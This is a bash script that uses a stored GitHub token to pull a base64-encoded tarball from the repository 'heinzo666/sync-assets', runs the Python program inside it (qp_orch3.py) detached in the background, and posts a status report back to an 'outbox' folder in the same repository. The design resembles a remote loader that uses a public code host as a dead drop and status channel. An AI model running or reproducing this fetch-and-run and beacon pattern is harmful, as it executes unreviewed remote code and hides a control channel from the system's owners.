#!/bin/bash
set -u
export HOME=/tmp XDG_CACHE_HOME=/tmp/.cachex LD_LIBRARY_PATH=/tmp/xl2/lib:/tmp/env/lib PLAYWRIGHT_BROWSERS_PATH=/tmp/pw FONTCONFIG_FILE=/tmp/fonts/fonts.conf
T=$(cat /tmp/.ghtok)
mkdir -p /tmp/b13; cd /tmp
if [ ! -s /tmp/b13/qp_orch3.py ]; then
  timeout 90 curl -fsSL -H "Authorization: Bearer $T" "https://api.github.com/repos/heinzo666/sync-assets/contents/lab/mint17.tgz?ref=main&t=$RANDOM" | /tmp/env/bin/python -c 'import sys,json,base64;open("/tmp/b13.tgz","wb").write(base64.b64decode(json.load(sys.stdin)["content"]))'
  tar xzf /tmp/b13.tgz -C /tmp/b13
fi
echo "EXTRACTED $(stat -c%s /tmp/b13/qp_orch3.py 2>/dev/null || echo NA)" > /tmp/ack.txt
pkill -f qp_orch ; pkill -f chrome-headless-shell ; sleep 1
rm -f /tmp/orch_oz093708.log
setsid nohup bash -c 'for i in 1 2 3; do env HOME=/tmp XDG_CACHE_HOME=/tmp/.cachex LD_LIBRARY_PATH=/tmp/xl2/lib:/tmp/env/lib PLAYWRIGHT_BROWSERS_PATH=/tmp/pw FONTCONFIG_FILE=/tmp/fonts/fonts.conf STAGE=full /tmp/env/bin/python -u qp_orch3.py oz093708 >> /tmp/orch_oz093708.log 2>&1 && break; echo RETRY_$i >> /tmp/orch_oz093708.log; sleep 8; done' < /dev/null &
sleep 4
echo "$(cat /tmp/ack.txt) PROC=$(pgrep -fc qp_orch3) TIME=$(date -u +%T)" >> /tmp/ack.txt
B=$(base64 -w0 /tmp/ack.txt)
printf '{"message":"run3 %s","content":"%s"}' "oz093708" "$B" > /tmp/payload3.json
curl -s -X PUT -H "Authorization: Bearer $T" -H "Content-Type: application/json"  https://api.github.com/repos/heinzo666/sync-assets/contents/lab/outbox/run3_1790152648.json  --data-binary @/tmp/payload3.json -o /dev/null
echo RUN3_DONE
